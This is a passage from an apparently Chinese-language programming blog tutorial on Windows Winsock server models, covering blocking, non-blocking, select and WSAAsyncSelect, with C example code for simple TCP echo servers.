&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, nBacklog) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span> &#123;</span><br><span class="line">    SOCKET server_fd = Bind_Listen(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_fd == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">        <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">        SOCKET *client_socket = (SOCKET *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SOCKET));</span><br><span class="line">        *client_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">        <span class="keyword">if</span> (*client_socket == INVALID_SOCKET) &#123;</span><br><span class="line">            perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">            <span class="built_in">free</span>(client_socket);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建线程处理客户端连接</span></span><br><span class="line">        _beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, ClientThread, (<span class="type">void</span> *)client_socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MyTepSerFun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="非阻塞式"><a href="#非阻塞式" class="headerlink" title="非阻塞式"></a>非阻塞式</h2><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，处理客户端连接</span></span><br><span class="line"><span class="type">unsigned</span> __stdcall <span class="title function_">ClientThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    SOCKET client_socket = *(SOCKET *)arg;</span><br><span class="line">    <span class="type">char</span> buffer[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *hello = <span class="string">&quot;Hello from server&quot;</span>;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置为非阻塞模式</span></span><br><span class="line">    u_long iMode = <span class="number">1</span>;</span><br><span class="line">    iResult = ioctlsocket(client_socket, FIONBIO, &amp;iMode);</span><br><span class="line">    <span class="keyword">if</span> (iResult != NO_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctlsocket failed&quot;</span>);</span><br><span class="line">        closesocket(client_socket);</span><br><span class="line">        <span class="built_in">free</span>(arg);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 接收数据</span></span><br><span class="line">        iResult = recv(client_socket, buffer, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (iResult &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Received: %s\n&quot;</span>, buffer);</span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            send(client_socket, hello, <span class="built_in">strlen</span>(hello), <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Hello message sent\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (iResult == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Connection closing...\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (WSAGetLastError() == WSAEWOULDBLOCK) &#123;</span><br><span class="line">                <span class="comment">// 没有数据可读，继续循环</span></span><br><span class="line">                Sleep(<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    closesocket(client_socket);</span><br><span class="line">    <span class="built_in">free</span>(arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定本地地址和监听</span></span><br><span class="line">SOCKET <span class="title function_">Bind_Listen</span><span class="params">(<span class="type">int</span> nBacklog)</span> &#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建socket文件描述符</span></span><br><span class="line">    <span class="keyword">if</span> ((server_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) == INVALID_SOCKET) &#123;</span><br><span class="line">        perror(<span class="string">&quot;socket failed&quot;</span>);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 绑定socket到端口</span></span><br><span class="line">    address.sin_family = AF_INET;</span><br><span class="line">    address.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    address.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bind(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;address, <span class="keyword">sizeof</span>(address)) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;bind failed&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 监听</span></span><br><span class="line">    <span class="keyword">if</span> (listen(server_fd, nBacklog) == SOCKET_ERROR) &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen&quot;</span>);</span><br><span class="line">        closesocket(server_fd);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> INVALID_SOCKET;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> server_fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器主体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyTepSerFun</span><span class="params">()</span> &#123;</span><br><span class="line">    SOCKET server_fd = Bind_Listen(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (server_fd == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client_addr</span>;</span></span><br><span class="line">        <span class="type">int</span> addrlen = <span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">        SOCKET *client_socket = (SOCKET *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SOCKET));</span><br><span class="line">        *client_socket = accept(server_fd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;addrlen);</span><br><span class="line">        <span class="keyword">if</span> (*client_socket == INVALID_SOCKET) &#123;</span><br><span class="line">            <span class="keyword">if</span> (WSAGetLastError() == WSAEWOULDBLOCK) &#123;</span><br><span class="line">                <span class="comment">// 没有连接请求，继续循环</span></span><br><span class="line">                Sleep(<span class="number">100</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                perror(<span class="string">&quot;accept&quot;</span>);</span><br><span class="line">                <span class="built_in">free</span>(client_socket);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建线程处理客户端连接</span></span><br><span class="line">        _beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, ClientThread, (<span class="type">void</span> *)client_socket, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(server_fd);</span><br><span class="line">    WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    MyTepSerFun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Select模型"><a href="#Select模型" class="headerlink" title="Select模型"></a>Select模型</h2><p>Select模型对应的是一个函数</p>
<p>从字面意思理解，<strong>select可从诸多连接中检测出可读的（accpet函数），也就是有响应的连接；也可以从诸多连接中检测出可写的（recv、send函数），也就是可以发送消息的连接。</strong></p>
<img src="/2024/07/05/CInternet/image-20240717223748067.png" alt="image-20240717223748067" style="zoom: 50%;">

<h3 id="select模型逻辑"><a href="#select模型逻辑" class="headerlink" title="select模型逻辑"></a>select模型逻辑</h3><p>select模型逻辑步骤如下：</p>
<ol>
<li>将所有的socket装进一个数组中</li>
<li>通过select函数遍历socket数组，取出有响应（可读、可写）的socket放进另一个数组</li>
<li>对存入有响应的socket数组处理</li>
</ol>
<h3 id="函数和结构体"><a href="#函数和结构体" class="headerlink" title="函数和结构体"></a>函数和结构体</h3><p>Select函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> nfds, 		<span class="comment">//直接为0</span></span></span><br><span class="line"><span class="params">    fd_set *readfds, <span class="comment">//套接字集合，针对读操作accept, recv</span></span></span><br><span class="line"><span class="params">    fd_set *writefds,<span class="comment">//针对写操作，如connect send等</span></span></span><br><span class="line"><span class="params">    fd_set *exceptfds,<span class="comment">//针对异常</span></span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> timeval *timeout<span class="comment">//超时设置，为NULL就是一直等</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>返回值 1，如果超时，返回值 0，出现错误，返回值Socket_ERROR</p>
<p>fd_set结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">fd_set</span>&#123;</span></span><br><span class="line">    u_int fd_count; <span class="comment">/* How many SET */</span></span><br><span class="line">    SOCKET fd_array[FD_SETSIZE]; <span class="comment">/* An array of SOCKETs*/</span></span><br><span class="line">&#125;fd_set;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FDZ_SETSIZE 64</span></span><br></pre></td></tr></table></figure>

<p>因为<code>#define FDZ_SETSIZE 64</code>所以最大不能超过64个，代表着可以并发处理64个套接字</p>
<p>如果想装更多的socket，可以通过在<strong>winsock2.h头文件前声明宏</strong>，给一个更大的值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FD_SETSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>四个操作fd_set的操作宏</strong></p>
<table>
<thead>
<tr>
<th>操作宏</th>
<th>作用</th>
<th>代码</th>
</tr>
</thead>
<tbody><tr>
<td>FD_ZERO</td>
<td>将客户端socket集合清零</td>
<td><code>FD_ZERO(&amp;clientSockets);</code></td>
</tr>
<tr>
<td>FD_SET</td>
<td>添加一个socket(超过默认值大小不再处理)</td>
<td><code>FD_SET(socketListen, &amp;clientSockets);</code></td>
</tr>
<tr>
<td>FD_CLR</td>
<td>从集合中删除指定的socket一定要close，手动释放</td>
<td><code>FD_CLR(socketListen,&amp;clientSockets);</code><br><code>closesocket(socketListen);</code></td>
</tr>
<tr>
<td>FD_ISSET</td>
<td>查询socket是否在集合中，不存在返回0，存在返回非0</td>
<td><code>FD_ISSET(socketListen, &amp;clientSockets);</code></td>
</tr>
</tbody></table>
<p>getsockopt函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getsockopt</span><span class="params">(</span></span><br><span class="line"><span class="params">    SOCKET s;<span class="comment">//套接字</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> level;<span class="comment">//选顶的等级包括SOL_SOCKET IPPROTO_TCP</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> optname;<span class="comment">//SOCKET选顶的名称SO_ERROR SO_ACCEPTCONN</span></span></span><br><span class="line"><span class="params">    <span class="type">char</span> FAR *optval;<span class="comment">//用于接收的缓冲区</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> FAR *optlen <span class="comment">//大小</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>成功返回0；失败返回SOCKET_ERROR</p>
<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 0. 初始化</span></span><br><span class="line">    WORD wsVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    WSADATA wsaData = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    WSAStartup(wsVersion, &amp;wsaData);</span><br><span class="line">    <span class="comment">// 1. 创建套接字</span></span><br><span class="line">    SOCKET sSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == sSocket) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;套接字闯创建失败!\n&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;套接字闯创建成功!\n&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 绑定套接字</span></span><br><span class="line">    sockaddr_in sockAddrInfo = &#123;<span class="number">0</span>&#125;;    <span class="comment">// 初始化</span></span><br><span class="line">    sockAddrInfo.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    sockAddrInfo.sin_port = htons(<span class="number">2118</span>); <span class="comment">// 端口</span></span><br><span class="line">    sockAddrInfo.sin_family = AF_INET; <span class="comment">// 地址族规范</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bRes = bind(sSocket, (sockaddr*)&amp;sockAddrInfo, <span class="keyword">sizeof</span>(sockAddrInfo));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == bRes) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;绑定失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;绑定成功!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 监听套接字</span></span><br><span class="line">    <span class="type">int</span> lRes = listen(sSocket, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == lRes) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;监听失败!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;监听成功!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd_set fdSocket; <span class="comment">// 定义</span></span><br><span class="line">    FD_ZERO(&amp;fdSocket); <span class="comment">// 初始化</span></span><br><span class="line">    FD_SET(sSocket, &amp;fdSocket); <span class="comment">// 将当前服务器创建的socket放入集合中</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        fd_set readfds = fdSocket; <span class="comment">// 定义可读的集合</span></span><br><span class="line">        fd_set writefds = fdSocket; <span class="comment">// 定义可写的集合</span></span><br><span class="line">        <span class="comment">// fd_set exceptfds = fdSocket;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取select函数的返回值</span></span><br><span class="line">        <span class="type">int</span> iRes = select(<span class="number">0</span>, &amp;readfds, &amp;writefds, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 如果返回值大于0则说明不存在无响应、错误的情况，继续向下</span></span><br><span class="line">        <span class="keyword">if</span> (iRes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 遍历可写集合，给每个socket发送Hello</span></span><br><span class="line">            <span class="keyword">for</span> (u_int i = <span class="number">0</span>; i &lt; writefds.fd_count; i++) &#123;</span><br><span class="line">                send(readfds.fd_array[i], <span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历可读集合</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; readfds.fd_count; i++) &#123;</span><br><span class="line">                <span class="comment">// 如果socket为当前服务器创建的scoket则进入accept等待消息</span></span><br><span class="line">                <span class="keyword">if</span> (readfds.fd_array[i] == sSocket) &#123;</span><br><span class="line">                    sockaddr_in s = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    <span class="type">int</span> l = <span class="keyword">sizeof</span>(s);</span><br><span class="line">                    SOCKET aSocket = accept(sSocket, (sockaddr*)&amp;s, &amp;l);</span><br><span class="line">                    <span class="keyword">if</span> (INVALID_SOCKET == aSocket)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    FD_SET(aSocket, &amp;fdSocket);</span><br><span class="line">                    <span class="comment">// inet_ntoa获取IP</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Accpet Client IP: %s \n&quot;</span>, inet_ntoa(s.sin_addr));</span><br><span class="line">                    <span class="comment">// 如果不是，则进入接收消息</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">char</span> buf[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">                    <span class="type">int</span> iRecv = recv(readfds.fd_array[i], buf, <span class="keyword">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">                    <span class="comment">// 判断接收消息的返回值，大于0则表示接收成功。</span></span><br><span class="line">                    <span class="keyword">if</span> (iRecv &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Recv: %s \n&quot;</span>, buf);</span><br><span class="line">                        <span class="comment">// 否则就关闭连接、关闭套接字</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        SOCKET tSocket = readfds.fd_array[i];</span><br><span class="line">                        FD_CLR(tSocket, &amp;fdSocket);</span><br><span class="line">                        shutdown(tSocket, SD_BOTH);</span><br><span class="line">                        closesocket(tSocket);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    closesocket(sSocket);</span><br><span class="line"></span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WSAAsyncSelect模型"><a href="#WSAAsyncSelect模型" class="headerlink" title="WSAAsyncSelect模型"></a>WSAAsyncSelect模型</h2><p>WSAAsyncSelect模式允许以windows消息的形式接收网络事件通知。这个模式是为了适应windows消息驱动环境而设置的，对性能要求不高的网络应用程序可采用此模式。</p>
<p>优缺点：WSAAsyncSelect模型最突出的特点是<strong>与windows的消息驱动机制融在了一起</strong>，这使得<strong>开发带GUI界面的网络程序</strong>变得很简单。但是如果连接增加，单个WINDOWS函数处理上千个客户请求时，服务器性能势必发受到影响。</p>
<p>WSAAsyncSelect()函数自动把套接字设为非阻塞模式，并且为套接字绑定一个窗口句柄，当有网络事件发生时，便向这个窗口发送消息。</p>
<p>语法：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> WSAAPI <span class="title">WSAAsyncSelect</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] SOCKET s, 		<span class="comment">//标识需要事件通知的套接字的描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HWND   hWnd,	<span class="comment">//标识在发生网络事件时接收消息的窗口的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] u_int  wMsg,	<span class="comment">//发生网络事件时要接收的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="type">long</span>   lEvent	<span class="comment">//位掩码，指定应用程序感兴趣的网络事件的组合</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>  <strong>lEvent</strong>参数:</p>
<table>
<thead>
<tr>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>FD_READ</td>
<td>欲接收 读准备好 的通知.</td>
</tr>
<tr>
<td>FD_WRITE</td>
<td>欲接收 写准备好 的通知.</td>
</tr>
<tr>
<td>FD_OOB</td>
<td>欲接收 带边数据到达 的通知.</td>
</tr>
<tr>
<td>FD_ACCEPT</td>
<td>欲接收 将要连接 的通知.</td>
</tr>
<tr>
<td>FD_CONNECT</td>
<td>欲接收 已连接好 的通知.</td>
</tr>
<tr>
<td>FD_CLOSE</td>
<td>欲接收 套接口关闭 的通知.</td>
</tr>
</tbody></table>
<h3 id="服务端示例"><a href="#服务端示例" class="headerlink" title="服务端示例"></a>服务端示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 8080  <span class="comment">// 定义服务器监听的端口号</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WM_SOCKET WM_USER + 1  <span class="comment">// 定义自定义消息，用于处理socket事件</span></span></span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span>;  <span class="comment">// 声明窗口过程函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nCmdShow)</span> &#123;</span><br><span class="line">    WNDCLASSEX wcex;</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG msg;</span><br><span class="line">    SOCKET server_fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">address</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化 Winsock</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (iResult != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, iResult);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册窗口类</span></span><br><span class="line">    wcex.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wcex.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wcex.lpfnWndProc = WndProc;</span><br><span class="line">    wcex.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">    wcex.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">    wcex.hInstance = hInstance;</span><br><span class="line">    wcex.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line">    wcex.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</span><br><span class="line">    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + <span class="number">1</span>);</span><br><span class="line">    wcex.lpszMenuName = <span class="literal">NULL</span>;</span><br><span class="line">    wcex.lpszClassName = <span class="string">&quot;WSAAsyncSelectExample&quot;</span>;</span><br><span class="line">    wcex.hIconSm = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!RegisterClassEx(&amp;wcex)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;RegisterClassEx failed: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span 